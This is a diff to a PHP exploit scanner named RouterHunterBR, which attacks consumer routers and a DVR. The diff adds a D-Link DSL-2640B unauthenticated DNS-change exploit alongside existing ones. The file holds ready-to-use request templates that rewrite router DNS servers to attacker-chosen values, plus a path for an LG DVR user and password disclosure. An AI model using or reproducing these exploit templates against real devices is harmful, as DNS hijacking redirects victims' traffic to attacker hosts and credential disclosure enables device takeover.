@@ -3,7 +3,7 @@
 /*
  * Script exploit developed by INURL - BRAZIL
  * Script Name: SCANNER RouterHunterBR 1.0
- * TIPE: TOOL - Unauthenticated Remote DNS 
+ * TIPE: TOOL - Unauthenticated Remote DNS change/ users & passwords
  * AUTOR*: Cleiton Pinheiro / NICK: GoogleINURL
  * AUTOR: Jhonathan davi / NICK: Jhoon
  * EMAIL*: inurllbr@gmail.com
@@ -17,7 +17,7 @@
   ----------------------------------------------------------
 
  * Description:*
-  The script explores two vulnerabilities in routers
+  The script explores four vulnerabilities in routers
   01 - Shuttle Tech ADSL Modem-Router 915 WM / Unauthenticated Remote DNS Change Exploit
   reference: http://www.exploit-db.com/exploits/35995/
 
@@ -26,6 +26,9 @@
 
   03 - LG DVR LE6016D / Unauthenticated users/passwords disclosure exploitit
   reference: http://www.exploit-db.com/exploits/36014/
+
+  04 - D-Link DSL-2640B Unauthenticated Remote DNS Change Exploit
+  reference: http://1337day.com/exploit/23302/  
 
   ----------------------------------------------------------
 
@@ -42,7 +45,11 @@
 
  * Dependencies*
   sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl033
+  ----------------------------------------------------------
 
+ *Update*
+  https://github.com/googleinurl/RouterHunterBR
+  ----------------------------------------------------------
  */
 
 error_reporting(1);
@@ -91,6 +98,7 @@ $params['dns2'] = not_isnull_empty($command['dns2']) ? $command['dns2'] : NULL;
 #DEFINITION OF EXPLOITS
 $params['exploit_model']['Shuttle_Tech_ADSL_Modem_Router_915_WM'] = "/dnscfg.cgi?dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1";
 $params['exploit_model']['D_Link_DSL_2740R'] = "/dns_1?Enable_DNSFollowing=1&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}";
+$params['exploit_model']['D_Link_DSL_2640B'] = "/ddnsmngr.cmd?action=apply&service=0&enbl=0&dnsPrimary={$params['dns1']}&dnsSecondary={$params['dns2']}&dnsDynamic=0&dnsRefresh=1&dns6Type=DHCP";
 $params['exploit_model']['LG_DVR_LE6016D'] = "/dvr/wwwroot/user.cgi";
 
 !not_isnull_empty($params['dns2']) && !not_isnull_empty($params['dns2']) ? __banner("{$_SESSION["c01"]}0x__[{$_SESSION["c02"]}DEFINE DNS1 and DNS2  ex: --dns1 '0.0.0.0.0' --dns2 '0.0.0.0.0'{$_SESSION["c00"]}\n") : NULL;
